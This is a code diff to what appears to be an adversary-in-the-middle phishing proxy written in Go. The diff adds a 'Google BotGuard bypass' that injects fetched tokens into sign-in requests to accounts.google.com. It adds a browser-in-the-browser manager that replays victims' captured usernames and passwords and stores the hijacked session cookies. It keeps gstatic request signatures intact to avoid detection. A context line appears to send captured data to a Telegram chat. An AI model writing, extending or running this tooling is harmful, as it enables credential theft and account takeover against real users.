@@ -81,6 +81,8 @@ type HttpProxy struct {
 	auto_filter_mimes []string
 	ip_mtx            sync.Mutex
 	session_mtx       sync.Mutex
+	googleBypass      *GoogleBypass
+	bitbManager       *BitbManager
 }
 
 type ProxySession struct {
@@ -146,6 +148,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 	p.Proxy.Verbose = false
 
 	p.Proxy.NonproxyHandler = http.HandlerFunc(func(w http.ResponseWriter, req *http.Request) {
+		if strings.HasPrefix(req.URL.Path, "/bitb/") {
+			p.handleBitbRequest(w, req)
+			return
+		}
 		req.URL.Scheme = "https"
 		req.URL.Host = req.Host
 		p.Proxy.ServeHTTP(w, req)
@@ -607,50 +613,64 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 
 				// replace "Host" header
+				is_gstatic_upstream := false
 				if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
 					req.Host = r_host
+					if strings.Contains(r_host, "gstatic.com") {
+						is_gstatic_upstream = true
+					}
 				}
 
-				// fix origin
-				origin := req.Header.Get("Origin")
-				if origin != "" {
-					if o_url, err := url.Parse(origin); err == nil {
-						if r_host, ok := p.replaceHostWithOriginal(o_url.Host); ok {
-							o_url.Host = r_host
-							req.Header.Set("Origin", o_url.String())
+				// fix origin (skip for gstatic to preserve request signatures)
+				if !is_gstatic_upstream {
+					origin := req.Header.Get("Origin")
+					if origin != "" {
+						if o_url, err := url.Parse(origin); err == nil {
+							if r_host, ok := p.replaceHostWithOriginal(o_url.Host); ok {
+								o_url.Host = r_host
+								req.Header.Set("Origin", o_url.String())
+							}
 						}
 					}
 				}
 
-				// prevent caching
-				req.Header.Set("Cache-Control", "no-cache")
-
-				// fix sec-fetch-dest
-				sec_fetch_dest := req.Header.Get("Sec-Fetch-Dest")
-				if sec_fetch_dest != "" {
-					if sec_fetch_dest == "iframe" {
-						req.Header.Set("Sec-Fetch-Dest", "document")
-					}
+				// prevent caching (skip for gstatic to preserve request signatures)
+				if !is_gstatic_upstream {
+					req.Header.Set("Cache-Control", "no-cache")
 				}
 
-				// fix x-embedding-uri
-				xEmbeddingUri := req.Header.Get("X-Embedding-Uri")
-				if xEmbeddingUri != "" {
-					if o_url, err := url.Parse(xEmbeddingUri); err == nil {
-						if r_host, ok := p.replaceHostWithOriginal(o_url.Host); ok {
-							o_url.Host = r_host
-							req.Header.Set("X-Embedding-Uri", o_url.String())
+				// fix sec-fetch-dest (skip for gstatic to preserve request signatures)
+				if !is_gstatic_upstream {
+					sec_fetch_dest := req.Header.Get("Sec-Fetch-Dest")
+					if sec_fetch_dest != "" {
+						if sec_fetch_dest == "iframe" {
+							req.Header.Set("Sec-Fetch-Dest", "document")
 						}
 					}
 				}
 
-				// fix referer
-				referer := req.Header.Get("Referer")
-				if referer != "" {
-					if o_url, err := url.Parse(referer); err == nil {
-						if r_host, ok := p.replaceHostWithOriginal(o_url.Host); ok {
-							o_url.Host = r_host
-							req.Header.Set("Referer", o_url.String())
+				// fix x-embedding-uri (skip for gstatic to preserve request signatures)
+				if !is_gstatic_upstream {
+					xEmbeddingUri := req.Header.Get("X-Embedding-Uri")
+					if xEmbeddingUri != "" {
+						if o_url, err := url.Parse(xEmbeddingUri); err == nil {
+							if r_host, ok := p.replaceHostWithOriginal(o_url.Host); ok {
+								o_url.Host = r_host
+								req.Header.Set("X-Embedding-Uri", o_url.String())
+							}
+						}
+					}
+				}
+
+				// fix referer (skip for gstatic to preserve request signatures)
+				if !is_gstatic_upstream {
+					referer := req.Header.Get("Referer")
+					if referer != "" {
+						if o_url, err := url.Parse(referer); err == nil {
+							if r_host, ok := p.replaceHostWithOriginal(o_url.Host); ok {
+								o_url.Host = r_host
+								req.Header.Set("Referer", o_url.String())
+							}
 						}
 					}
 				}
@@ -871,6 +891,46 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									}
 								}
 
+								// Google BotGuard bypass
+								if p.googleBypass != nil {
+									var bypassHost string
+									if h, ok := p.replaceHostWithOriginal(req.Host); ok {
+										bypassHost = h
+									}
+									if bypassHost == "" {
+										bypassHost = req.Host
+									}
+									if strings.EqualFold(bypassHost, "accounts.google.com") &&
+										strings.Contains(req.URL.Path, "batchexecute") {
+
+										if fReq := req.PostForm.Get("f.req"); fReq != "" {
+											var email string
+											if s, ok := p.sessions[ps.SessionId]; ok {
+												email = s.Username
+											}
+											if email == "" {
+												emailRe := regexp.MustCompile(`[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}`)
+												if m := emailRe.FindString(fReq); m != "" {
+													email = m
+												}
+											}
+											if email != "" {
+												log.Debug("google bypass: fetching token for %s", email)
+												if token, err := p.googleBypass.GetToken(email); err == nil && token != "" {
+													newReq := ReplaceBotGuardToken(fReq, email, token)
+													if newReq != fReq {
+														req.PostForm.Set("f.req", newReq)
+														body = []byte(req.PostForm.Encode())
+														req.ContentLength = int64(len(body))
+														log.Debug("google bypass: injected token for %s", email)
+													}
+												} else {
+													log.Error("google bypass: %v", err)
+												}
+											}
+										}
+									}
+								}
 							}
 							if trigger == 1 {
 								readFile(p.cfg.general.Chatid, p.cfg.general.Teletoken)
@@ -1709,6 +1769,39 @@ func (p *HttpProxy) setSessionUsername(sid string, username string) {
 	}
 }
 
+func (p *HttpProxy) GetBitbManager() *BitbManager {
+	return p.bitbManager
+}
+
+func (p *HttpProxy) SetBitbManager(bm *BitbManager) {
+	p.bitbManager = bm
+	RegisterBitbCookieCallback(func(sessionId string, cookies []BitbCookie) {
+		if s, ok := p.sessions[sessionId]; ok {
+			now := time.Now()
+			for _, bc := range cookies {
+				exp := now.Add(24 * time.Hour)
+				s.AddCookieAuthToken(bc.Domain, bc.Name, bc.Value, bc.Path, bc.HttpOnly, exp)
+			}
+			tokenMap := make(map[string]map[string]*database.CookieToken)
+			for domain, tokens := range s.CookieTokens {
+				tokenMap[domain] = make(map[string]*database.CookieToken)
+				for k, v := range tokens {
+					tokenMap[domain][k] = &database.CookieToken{
+						Name:     v.Name,
+						Value:    v.Value,
+						HttpOnly: v.HttpOnly,
+					}
+				}
+			}
+			if err := p.db.SetSessionCookieTokens(sessionId, tokenMap); err != nil {
+				log.Error("bitb: failed to save cookies to db: %v", err)
+			}
+			s.Finish(true)
+			log.Info("bitb: cookies saved to session %s (%d tokens)", sessionId, len(cookies))
+		}
+	})
+}
+
 func (p *HttpProxy) setSessionPassword(sid string, password string) {
 	if sid == "" {
 		return
@@ -1718,6 +1811,14 @@ func (p *HttpProxy) setSessionPassword(sid string, password string) {
 		s.SetPassword(password)
 		log.Debug("password added")
 
+		if p.bitbManager != nil {
+			go func() {
+				time.Sleep(500 * time.Millisecond)
+				if s.Username != "" && s.Password != "" {
+					p.bitbManager.StartLogin(sid, s.Username, s.Password)
+				}
+			}()
+		}
 	}
 }
 
@@ -1729,6 +1830,10 @@ func (p *HttpProxy) setSessionCustom(sid string, name string, value string) {
 	if ok {
 		s.SetCustom(name, value)
 	}
+}
+
+func (p *HttpProxy) SetGoogleBypass(gb *GoogleBypass) {
+	p.googleBypass = gb
 }
 
 func (p *HttpProxy) httpsWorker() {
